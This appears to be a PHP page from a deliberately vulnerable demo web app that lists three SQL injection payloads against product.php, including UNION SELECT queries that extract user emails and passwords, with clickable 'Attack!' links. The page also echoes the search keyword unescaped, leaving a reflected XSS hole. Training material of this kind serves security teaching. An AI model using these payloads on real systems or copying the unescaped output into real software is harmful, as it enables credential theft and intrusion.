<?php
include_once("init.php");

$search = $_GET['keyword'];

$attacks = array();
$attacks[0] = array(
    "name" => "SQL Injection",
    "description" => "Show value of item 2 instead of nothing",
    "value" => "0' OR id=2 --",
    "attack" => "product.php?id=0'%20OR%20id=2--"
); 

$attacks[1] = array(
    "name" => "SQL Injection",
    "description" => "Show email and password for a user with id 1",
    "value" => "0' UNION SELECT 'bla', email as name, pw as description, 'bla', 'bla','bla' FROM users WHERE id=1 --",
    "attack" => "product.php?id=0'%20UNION%20SELECT%20'bla',%20email%20as%20name,%20pw%20as%20description,%20'bla',%20'bla','bla'%20FROM%20users%20WHERE%20id=1%20%20--");

$attacks[2] = array(
    "name" => "SQL Injection",
    "description" => "Show email and password",
   "value" => "UNION SELECT email as id, pw as name, email as description, email as price, email as secret, email as hidden FROM users--",
   "attack" => "product.php?id=-1%27%20UNION%20SELECT%20email%20as%20id,%20email%20as%20name,%20pw%20as%20description,%20email%20as%20price,%20email%20as%20secret,%20email%20as%20hidden%20FROM%20users--"
);

?>

<?php
include_once("header.php");
?>

<div class="row listing-row">
	<div class="col s12 m10 offset-m1 ">  
		<div class="card-panel">     
			<h4>Search results for: <?=$search?></h4>
            <table class=" highlight stripped responsive-table listing">
                <thead>
                    <tr>
                        <th data-field="name">Name</th>
                        <th data-field="description">Description</th>
                        <th data-field="value">Value</th>
                        <th data-field="attack">Attack!</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach($attacks as $attack): ?>
                        <tr>
                            <td><?php echo $attack['name']; ?></td>
                            <td><?php echo $attack['description']; ?></td>
                            <td><?php echo $attack['value'];?></td>
                            <td><a class="waves-effect waves-light btn btn-small red darken-2" href="<?=$attack['attack']?>" rel="_target">Attack!</a</td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>
    
</div>   

<?php 
include_once("footer.php");
?>


